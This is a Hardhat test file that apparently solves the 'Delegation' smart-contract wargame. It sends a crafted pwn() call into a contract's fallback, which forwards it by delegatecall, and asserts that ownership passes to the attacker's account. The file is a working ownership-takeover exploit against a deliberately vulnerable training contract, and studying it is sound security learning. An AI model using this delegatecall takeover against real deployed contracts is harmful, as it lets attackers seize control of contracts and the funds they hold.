import { loadFixture, ethers, expect } from "./setup";

const _ticketPrice = ethers.parseEther("0.1");
const _duration = 10;
const _ownerCommission = 2;

describe("Delegate contract", function() {
    async function deploy() {
		const owner = (await ethers.getSigners())[0];
        const newOwner = (await ethers.getSigners())[1];

        const delegateFactory = await ethers.getContractFactory("Delegate");
        const delegate = await delegateFactory.deploy(owner.address);
        await delegate.waitForDeployment();

        const attackFactory = await ethers.getContractFactory("Delegation");
        const attack = await attackFactory.deploy(await delegate.getAddress());
        await attack.waitForDeployment();

        return {delegate, attack, owner, newOwner};
    }

    it ("should be hacked", async function() {
        const {delegate, attack, owner, newOwner} = await loadFixture(deploy);
        const delegateOwnerAddressBefore = await attack.owner();

        expect(delegateOwnerAddressBefore).to.be.eq(owner.address);

        let functionPwn = ["function pwn()"];
        let iface = new ethers.Interface(functionPwn);
        await newOwner.sendTransaction({
            to: await attack.getAddress(),
            data: iface.encodeFunctionData("pwn"),
        });

        const delegateOwnerAddressAfter = await attack.owner();
        expect(delegateOwnerAddressAfter).to.be.eq(newOwner.address);
    });
})